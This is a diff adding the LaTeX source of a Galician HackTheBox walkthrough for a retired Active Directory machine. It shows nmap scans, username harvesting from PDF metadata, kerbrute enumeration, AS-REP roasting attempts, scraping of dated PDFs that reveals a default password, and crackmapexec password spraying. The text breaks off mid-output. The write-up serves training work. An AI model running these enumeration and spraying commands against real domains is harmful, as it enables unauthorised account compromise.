@@ -1,0 +1,1042 @@
+\documentclass[a4paper]{article}
+
+\usepackage[utf8]{inputenc}
+\usepackage[galician]{babel}
+\usepackage[margin=2cm, top=2cm, includefoot, bottom=2.4cm]{geometry}
+\usepackage{graphicx} %Inserción imaxes
+\usepackage[export]{adjustbox}
+\graphicspath{ {images/} }
+\usepackage[table,xcdraw]{xcolor}
+\usepackage[utf8]{inputenc}
+\usepackage[most]{tcolorbox} %Inserción cadrados
+\usepackage{fancyhdr} % Definición estilo páxina
+\usepackage[hidelinks]{hyperref} % Xestión hipervínculos
+\usepackage{listings} %Inserción de código no documento
+\usepackage{parskip} %Quitar tabulación paragrafos
+\usepackage{smartdiagram}
+\usepackage{tikz}
+\usepackage{zed-csp} %Inserción de esquemas
+\usepackage{enumitem}
+\usepackage[none]{hyphenat} %Evitar cortar palabras no fin de liña
+\usepackage[toc,page]{appendix}
+
+% Cores
+\definecolor{bluePortada}{HTML}{0850BF}
+\definecolor{blackFondoImaxes}{HTML}{1A1C23}
+
+% Variables
+\newcommand{\logoPortada}{hackthebox_logo_new.png}
+\newcommand{\machineName}{Template}\par
+\newcommand{\logoMachine}{machine_template_logo.png}
+\newcommand{\logoMachineRhead}{machine_template_logo_rhead.png}
+\newcommand{\infoMachine}{machine_template_info.png}
+\newcommand{\pingMachine}{ping_template.png}
+\newcommand{\nmapAllPorts}{nmap_template_allPorts.png}
+\newcommand{\nmapTargeted}{nmap_template_targeted.png}
+\newcommand{\hoveringMachine}{hovering_template.png}
+\newcommand{\searchsploitMachine}{machine_template_searchsploit.png}
+\newcommand{\ccbysa}{88x31.png}
+\newcommand{\bloodhound}{graph-bloodhound-elevation-privilege.png}
+\newcommand{\urlsInterese}{urls-de-interese.png}
+%\newcommand{\startDate}{06/07/2022}
+\newcommand{\startDate}{\today}
+\newcommand{\ipTarget}{10.10.10.248}
+\newcommand{\ipLocal}{10.10.14.12}
+\renewcommand{\lstlistingname}{Código}
+\renewcommand{\appendixpagename}{Anexos}
+\renewcommand{\appendixtocname}{Anexos}
+\renewcommand{\appendixname}{Anexo}
+
+% Adicionais
+\setlength{\headheight}{60.2pt}
+\setlength{\footskip}{20pt}
+\setlength{\textheight}{680pt}
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhfoffset[L,R]{1.4cm}
+\lhead{\includegraphics[width=6cm]{\logoPortada}\\}
+\rhead{\includegraphics[width=5cm]{\logoMachineRhead}}
+\fancyfoot[R]{\hspace{0.1cm}\\\hspace{0.1cm}\\\thepage}
+\fancyfoot[L]{\textbf{Ricardo Feijoo Costa}\\
+\href{http://creativecommons.org/licenses/by-sa/4.0/}{\includegraphics[scale=0.6]{\ccbysa}}\\
+\href{http://creativecommons.org/licenses/by-sa/4.0/}{\textbf{\color{blue}Creative Commons Attribution-ShareAlike 4.0 International License}}}
+\renewcommand{\headrulewidth}{3pt}
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    escapechar=¬,
+    columns=fullflexible
+}
+
+\lstset{style=mystyle}
+
+\usetikzlibrary{positioning, shapes, arrows, shadows.blur}
+\makeatletter % N.B.
+\tikzset{module/.style={%
+      \pgfkeysvalueof{/smart diagram/module shape},
+      thick,
+      draw=\sm@core@bordercolor,
+      top color=white,
+      bottom color=\col,
+      text=\sm@core@textcolor,
+      % text width=\sm@core@moduletextwidth, % Only necessary change
+      minimum width=\sm@core@modulewidth,
+      minimum height=\sm@core@moduleheight,
+      font=\sm@core@modulefontsize,
+      \sm@core@borderdecoration,
+      node distance=1cm
+   },
+   diagram arrow type/.style={%
+      \sm@core@arrowstyle,
+      >=\sm@core@arrowtip,
+      line width=\sm@core@arrowlinewidth,
+      \col
+   },%
+}
+\makeatother
+
+% ------------------------------------------------------------
+\begin{document}
+        \begin{titlepage}
+        \vspace*{-3cm}
+        \centering
+        \href{https://www.hackthebox.com/}{\includegraphics[width=0.5\textwidth]{\logoPortada}}\par\vspace{1cm}
+        {\scshape\LARGE \textbf{Informe Técnico: Walkthrough}\par}
+        \vfill
+        {\Huge\bfseries\textcolor{bluePortada}{Máquina retirada: \machineName}\par}
+        \vfill
+        \includegraphics[width=1.0\textwidth,height=10cm,keepaspectratio,cfbox=blue 1pt 1pt]{\logoMachine}\par\
+        % ------------------------------------------------------------
+        \begin{comment}
+        \smartdiagramset{back arrow disabled=true, module minimum height=1cm,% initial: 1cm
+                module minimum width=1.2cm,% initial: 2cm
+                module x sep=2.4}% initial 2.75
+        \makebox[\textwidth]{\smartdiagram[flow diagram:horizontal]
+                {nmap, hovering\\web, pdfs, kerberos, winrm\\flag user.txt, ps1, bloodhound, gmsapassword, flag\\root.txt}}
+        \end{comment}
+        % ------------------------------------------------------------
+        \tikzstyle{blockRounder} = [rectangle, draw, text centered, rounded corners=3pt, minimum height=2em, blur shadow={shadow blur steps=5}]
+        \tikzstyle{connector} = [draw, -latex']
+        \begin{adjustbox}{width=0.9\paperwidth,center}
+          \begin{tikzpicture}
+          \node [blockRounder, fill=pink!80] at (-21.5,0) (start) {nmap};
+          \node [blockRounder, fill=green!8!white] at (-19.5,0) (one) {\begin{tabular}{c}hovering\\web\end{tabular}};
+          \node [blockRounder, fill=blue!20] at (-17.6,0) (two) {pdfs};
+          \node [blockRounder, fill=green!20] at (-15.3,0) (three) {\begin{tabular}{c}crackmapexec\\smb\end{tabular}};
+          \node [blockRounder, fill=orange!20] at (-12.2,0) (four) {\begin{tabular}{c}smb shares\\flag user.txt\end{tabular}};
+          \node [blockRounder, fill=yellow!20] at (-8.7,0) (five) {\begin{tabular}{c}movemento lateral\\powershell\end{tabular}};
+          \node [blockRounder, fill=pink!20] at (-8.5,-1.25) (six) {\begin{tabular}{c}dnstool\\responder\end{tabular}};
+          \node [blockRounder, fill=cyan!20] at (-10.9,-1.25) (seven) {bloodhound};
+          \node [blockRounder, fill=brown!20] at (-13.6,-1.25) (eight) {GMSApassword};
+          \node [blockRounder, fill=violet!20] at (-16.7,-1.25) (nine) {AllowToDelegate};
+          \node [blockRounder, fill=lime!60] at (-20.4,-1.25) (ten) {\begin{tabular}{c}TGT for user\\Administrator.ccache\end{tabular}};
+          \node [blockRounder, fill=red!60] at (-20.8,-2.5) (end) {\begin{tabular}{c}flag\\root.txt\end{tabular}};
+          \path [connector] (start) -- (one);
+          \path [connector] (one) -- (two);
+          \path [connector] (two) -- (three);
+          \path [connector] (three) -- (four);
+          \path [connector] (four) -- (five);
+          \path [connector] ([xshift=-2mm] five.south east) |- (six);
+          \path [connector] (six) -- (seven);
+          \path [connector] (seven) -- (eight);
+          \path [connector] (eight) -- (nine);
+          \path [connector] (nine) -- (ten);
+          \path [connector] ([xshift=2mm] ten.south west) |- (end);
+          \end{tikzpicture}
+        \end{adjustbox}
+        \vfill
+        % ------------------------------------------------------------
+        \begin{comment}
+          \begin{tikzpicture}[node distance = 2.4cm]
+          \node [blockRounder, fill=pink!80] (start) {nmap};
+          \node [blockRounder, fill=green!8!white, right of=start] (one) {\begin{tabular}{c}hovering\\web\end{tabular}};
+          \node [blockRounder, fill=blue!20, right of=one] (two) {pdfs};
+          \node [blockRounder, fill=green!20, right of=two] (three) {kerberos};
+          \node [blockRounder, fill=orange!20, right of=three] (four) {\begin{tabular}{c}winrm\\flag user.txt\end{tabular}};
+          \node [blockRounder, fill=yellow!20, right of=four] (five) {ps1};
+          \node [blockRounder, fill=pink!20, right of=five] (six) {bloodhound};
+          \node [blockRounder, fill=brown!20, below of=five] (seven) {gmsapassword};
+          \node [blockRounder, fill=violet!20, left of=seven] (eight) {ps1};
+          \node [blockRounder, fill=red!60, left of=eight] (nine) {\begin{tabular}{c}flag\\root.txt\end{tabular}};
+          \path [connector] (start) -- (one);
+          \path [connector] (one) -- (two);
+          \path [connector] (two) -- (three);
+          \path [connector] (three) -- (four);
+          \path [connector] (four) -- (five);
+          \path [connector] (five) -- (six);
+          \path [connector] (six) |- (seven);
+          \path [connector] (seven) -- (eight);
+          \path [connector] (eight) -- (nine);
+          \end{tikzpicture}
+        \end{comment}
+        % ------------------------------------------------------------
+        \vspace*{-0.4cm} 
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-1mm,yshifttext=-1mm},
+        colback=red!5!white,colframe=red!75!black,colbacktitle=red!90!black,
+  title=LIMITACIÓN DE RESPONSABILIDADE,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!75!black} ]
+               O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Por tanto, non se fai responsable en ningún caso, nin pode ser considerado legalmente responsable en ningún caso, das consecuencias que poidan derivarse da información contida nel ou que esté enlazada dende ou hacia el, incluíndo os posibles erros e información incorrecta existentes, información difamatoria, así como das consecuencias que se poidan derivar sobre a súa aplicación en sistemas de información reais e/ou virtuais. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.
+        \end{tcolorbox}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+  \centering
+        \begin{itemize}[leftmargin=5.5mm]
+        \item Informe xerado con \href{https://www.latex-project.org/}{\color{blue}{\LaTeX}}
+        \item Informe baseado no vídeo de \href{https://youtu.be/riNRHoEOBeU}{\color{blue}{S4vitar: Cómo crear un reporte profesional en LaTeX}}
+        \item \href{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/ActiveDirectory}{\color{blue}{https://github.com/ricardofc/repoEDU-CCbySA/tree/main/SI/Pentester/ActiveDirectory}}
+        \end{itemize}
+\end{tcolorbox}
+        \vspace*{-0.1cm} 
+        {\large \startDate \par}
+        \end{titlepage}
+        % ------------------------------------------------------------
+        % Índice
+        \clearpage
+        \tableofcontents
+        \clearpage
+        % ------------------------------------------------------------
+        \section{Escenario}
+        \begin{itemize}
+                \item Plataforma \href{https://hackthebox.eu}{\textbf{\color{blue}HackTheBox}}.
+                \item Máquina retirada \textbf{\machineName} 
+        \end{itemize}
+        \vspace{0.2cm}
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.4\textwidth]{\infoMachine}
+                \caption{Detalles da máquina}
+        \end{figure}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=Dirección URL,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+  \centering
+  \vspace{0.1cm}
+  \href{https://app.hackthebox.com/machines/357}{\color{blue}{https://app.hackthebox.com/machines/357}}
+\end{tcolorbox}
+
+        \section{Obxectivos}
+        \begin{itemize}
+                \item Auditar o servidor \textbf{\machineName}
+                \item Enumerar posibles vectores de explotación
+                \item Determinar alcance e impacto dun ataque sobre o sistema en produción.
+        \end{itemize}
+        \subsection{Fluxo de traballo}
+        \vspace{0.5cm}
+
+        \begin{figure}[h]
+                \begin{center}
+                \hspace*{4cm}
+                        \smartdiagram[priority descriptive diagram]{
+                        Recoñecemento sobre o sistema,
+                        Detección de vulnerabilidades,
+                        Explotación de vulnerabilidades,
+                        Escalada de privilexios
+                        }
+                        \begin{tikzpicture}[overlay]
+                                \node[left=of module4,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Flag administrador}}}\end{tcolorbox}};
+                                \node[left=of module3,xshift=-60mm,yshift=-13mm]{\begin{tcolorbox}[colback=white,colframe=red!75!black,hbox]{\textbf{\color{red}{Acceso ao sistema: Flag usuario}}}\end{tcolorbox}};
+                                \node[left=of module2,xshift=-1mm,yshift=-1mm] {};
+                                \node[left=of module1,xshift=-1mm,yshift=1mm] {};
+                        \end{tikzpicture}
+                \end{center}
+                \caption{Fluxo de traballo}
+        \end{figure}
+
+        \clearpage
+
+        \section{Análisis de vulnerabilidades}
+        \subsection{Recoñemento inicial}
+        \vspace{0.2cm}
+        \begin{itemize}
+                \item Comprobación de conectividade e detección de sistema operativo: 
+                \begin{itemize}
+                        \item TTL $\simeq$ 64 $\Rightarrow$ GNU/Linux
+                        \item TTL $\simeq$ 128 $\Rightarrow$ Microsoft Windows
+                \end{itemize}
+
+        \begin{figure}[h]
+                \begin{center}
+                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
+                                \includegraphics[width=0.5\textwidth,height=8cm,keepaspectratio]{\pingMachine}
+                        \end{tcolorbox}
+                \end{center}
+                \caption{Recoñecemento inicial sobre o sistema obxectivo}
+        \end{figure}
+
+        \vspace{0.2cm}
+
+                \item Escaneo/detección de portos abertos mediante \textbf{nmap}
+        \begin{lstlisting}[language=Bash, caption=nmap: Portos TCP open]
+$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ¬\ipTarget¬
+        \end{lstlisting}
+         \begin{figure}[h]
+                \begin{center}
+                        \begin{tcolorbox}[colback=blackFondoImaxes,hbox]
+                                \centering
+                                \includegraphics[width=0.5\textwidth,height=8cm,keepaspectratio]{\nmapAllPorts}
+                        \end{tcolorbox}
+                \end{center}
+                \caption{Recoñecemento con nmap}
+        \end{figure}
+
+        \clearpage
+        \item Detección de servizos e versións sobre os portos sobre os cales foi posible explotar o sistema:
+
+        \begin{lstlisting}[language=Bash, caption=nmap scripting sobre servizos e versións]
+$ sudo nmap -p80,88,389,445,639,3268,3269,5985 -sCV -vvv -n ¬\ipTarget¬
+        \end{lstlisting}
+         \begin{figure}[h]
+                \begin{center}
+                \makebox[\textwidth]{\includegraphics[width=0.9\paperwidth]{\nmapTargeted}}
+                \caption{Numeración de servizos e versións}
+                \label{fig:servicesResults}
+                \end{center}
+        \end{figure}
+
+        \end{itemize}
+        \subsection{Enumeración servidor web}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Porto
+        \where
+        80
+        \end{schema}
+ 
+        Facendo \textit{hovering} pola páxina descargamos 2 pdfs e revisamos os seus metadatos coa ferrementa \textbf{exiftool}, atopando 2 posibles usuarios do dominio: \textit{William.Lee} e \textit{Jose.Williams}
+
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=0.5\textwidth]{\hoveringMachine}
+                \caption{Hovering: http://\ipTarget}
+        \end{figure}
+
+
+        \begin{lstlisting}[language=Bash, caption=Metadatos: exiftool]
+$ exiftool 2020-01-01-upload.pdf | grep -i creator
+Creator                         : William.Lee
+
+$ exiftool 2020-12-15-upload.pdf | grep -i creator
+Creator                         : Jose.Williams\end{lstlisting}
+
+        \clearpage
+        \subsection{Enumeración ldap}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Portos
+        \where
+        389,639,3268,3269
+        \end{schema}
+ Revisando a saída do comando nmap na figura \ref{fig:servicesResults} da páxina \pageref{fig:servicesResults} obtemos información sobre ldap atopando o dominio \textit{template.htb} e o hostname \textit{dc.template.htb}. Entón engadimos estes nomes ao ficheiro /etc/hosts para a súa resolución:
+        \begin{lstlisting}[language=Bash, caption=Resolución DNS: /etc/hosts]
+$ sudo bash -c "echo '¬\ipTarget¬  dc.template.htb template.htb' >> /etc/hosts"\end{lstlisting}
+
+        \subsection{Enumeración kerberos}
+        \vspace{0.2cm}
+
+        \begin{schema}{TCP}
+        Porto
+        \where
+        88
+        \end{schema}
+ 
+        Como parece que temos 2 usuarios do dominio imos probar se é así coa ferramenta kerbrute \textit{-o dominio template.htb foi atopado a través do escaneo co nmap-} :
+
+        \begin{lstlisting}[language=Bash, caption=Enumeración usuarios kerberos: kerbrute]
+$ echo -e 'William.Lee\nJose.Williams' > users-potenciais-kerberos.txt
+
+$ kerbrute userenum --dc 10.10.10.248 -d template.htb users-potenciais-kerberos.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 06/05/22 - Ronnie Flathers @ropnop
+
+2022/06/05 23:45:09 >  Using KDC(s):
+2022/06/05 23:45:09 >  	10.10.10.248:88
+
+2022/06/05 23:45:09 >  [+] VALID USERNAME:	 William.Lee@template.htb
+2022/06/05 23:45:09 >  [+] VALID USERNAME:	 Jose.Williams@template.htb
+2022/06/05 23:45:09 >  Done! Tested 6 usernames (2 valid) in 0.128 seconds
+
+\end{lstlisting}
+
+Entón si, temos 2 usuarios kerberos e non temos contrasinais probamos o ASREPROASTAttack:
+        \begin{lstlisting}[language=Bash, caption=Enumeración usuarios kerberos: ASREPROASTAttack]
+$ GetNPUsers.py template.htb/ -no-pass -usersfile users-potenciais-kerberos.txt
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+\end{lstlisting}
+Pero non hai sorte.
+
+\subsection{Alternativas}
+Como co anterior non houbo sorte probamos outras opcións como as seguintes:
+\begin{itemize}
+        \item Cos usuarios testeados probar sesións sen autenticación para rpcclient
+        \item Intentar buscar por forza bruta contrasinais para eses usuarios con crackmapexec
+        \item Fuzzing: wfuzz, gobuster, dirbuster...
+\end{itemize}
+
+\subsection{Descargar pdfs}
+Pero seguimos sen ter éxito, entón probamos a seguinte idea: Se en \textit{documents} existen 2 documentos con \textbf{\emph{data}-upload.pdf} existirán máis? Entón, xeramos un script para logo intentar descargar os arquivos:
+
+        \begin{lstlisting}[language=Bash, caption=script Bash]
+$ cat script.sh
+for i in $(seq 2020 2022)
+do
+  for j in $(seq 1 12)
+  do
+    [ $j -le 9 ] && j=$(echo 0$j)
+    for k in $(seq 1 31)
+    do
+      [ $k -le 9 ] && k=$(echo 0$k)
+      echo $i-$j-$k
+    done
+  done
+done | tee -a days.txt\end{lstlisting}
+
+
+        \begin{lstlisting}[language=Bash, caption=Descargar documentos]
+$ mkdir uploads;while read line
+do
+  wget http://¬\ipTarget¬/documents/${line}-upload.pdf && wget http://¬\ipTarget¬/documents/${line}-upload.pdf -O uploads/${line}-upload.pdf 
+done < days.txt\end{lstlisting}
+
+
+En uploads temos os arquivos descargados, co cal xeramos un novo script tal que mediante \textbf{exiftool} imos quedarnos co parametro \textbf{Creator}, de tal xeito que imos xerar un ficheiro cos posibles usuarios do dominio:
+        \begin{lstlisting}[language=Bash, caption=Descargar documentos]
+$ for i in $(ls uploads)
+do
+  exiftool uploads/$i | grep -i creator 2>/dev/null | tee -a creators.txt
+done
+$ sort -u creators.txt | awk '{print $NF}' | sponge creators.txt\end{lstlisting}
+
+Agora imos de novo con kerbrute validar se os usuarios atopados existen no dominio:
+
+        \begin{lstlisting}[language=Bash, caption=kerbrute]
+$ kerbrute userenum --dc 10.10.10.248 -d template.htb creators.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 06/05/22 - Ronnie Flathers @ropnop
+
+2022/06/05 20:59:57 >  Using KDC(s):
+2022/06/05 20:59:57 >  	10.10.10.248:88
+
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 David.Reed@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 David.Mcbride@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Darryl.Harris@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Danny.Matthews@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Daniel.Shelton@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Brian.Morris@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Anita.Roberts@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Brian.Baker@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 Ian.Duncan@template.htb
+2022/06/05 20:59:57 >  [+] VALID USERNAME:	 David.Wilson@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Jason.Wright@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Richard.Williams@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Nicole.Brock@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Kelly.Long@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Jose.Williams@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 John.Coleman@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Jessica.Moody@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Jennifer.Thomas@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Jason.Patterson@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Teresa.Williamson@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Travis.Evans@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 William.Lee@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Veronica.Patel@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Tiffany.Molina@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Thomas.Valenzuela@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Thomas.Hall@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Stephanie.Young@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Scott.Scott@template.htb
+2022/06/05 20:59:58 >  [+] VALID USERNAME:	 Samuel.Richardson@template.htb
+2022/06/05 20:59:58 >  Done! Tested 30 usernames (30 valid) in 0.388 seconds\end{lstlisting}
+
+De novo probamos con ASREPROASTAttack:
+        \begin{lstlisting}[language=Bash, caption=ASREPROASTAttack]
+$ GetNPUsers.py template.htb/ -no-pass -usersfile creators.txt
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set\end{lstlisting}
+
+E de novo nada, sen éxito.
+\subsubsection{Contido ficheiros descargados}
+Como non tivemos sorte imos revisar o contido dos ficheiros por se atopamos algo de interese. Para iso, automatizamos a tarefa e convertimos os pdf a texto coa ferramenta \textbf{pdftotext}:
+
+        \begin{lstlisting}[language=Bash, caption=pdftotext]
+$ for i in $(ls uploads/*pdf); do 
+    pdftotext $i $i.txt
+done
+$ for i in $(ls uploads/*txt);do
+echo $i | tee -a uploads/revisar.txt
+cat $i | tee -a uploads/revisar.txt
+echo --------- | tee -a uploads/revisar.txt
+done\end{lstlisting}
+
+Atopamos de interese o seguinte ficheiro:
+        \begin{lstlisting}[language=Bash, caption=Contrasinal por defecto]
+::::::::::::::
+2020-06-04-upload.pdf.txt
+::::::::::::::
+New Account Guide
+Welcome to Template Corp!
+Please login using your username and the default password of:
+NewTemplateCorpUser9876
+After logging in please change your password as soon as possible.\end{lstlisting}
+
+        \section{Explotación de vulnerabilidades}
+        \vspace{0.2cm}
+        \subsection{Acceso ao sistema}
+        \vspace{0.2cm}
+
+
+Entón imos probar se algún dos usuarios existentes no dominio non modificou o contrasinal:
+        \begin{lstlisting}[language=Bash, caption=Usuario/s con contrasinal por defecto, linewidth=18.7cm]
+$ crackmapexec smb ¬\ipTarget¬ -u creators.txt -p 'NewTemplateCorpUser9876' --continue-on-success
+SMB   10.10.10.248 445 DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:template.htb) (signing:True) (SMBv1:False)
+SMB   10.10.10.248 445 DC   [-] template.htb\Anita.Roberts:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Brian.Baker:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Brian.Morris:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Daniel.Shelton:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Danny.Matthews:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Darryl.Harris:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\David.Mcbride:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\David.Reed:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\David.Wilson:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Ian.Duncan:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Jason.Patterson:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Jason.Wright:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Jennifer.Thomas:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Jessica.Moody:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\John.Coleman:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Jose.Williams:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Kaitlyn.Zimmerman:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Kelly.Long:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Nicole.Brock:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Richard.Williams:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Samuel.Richardson:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
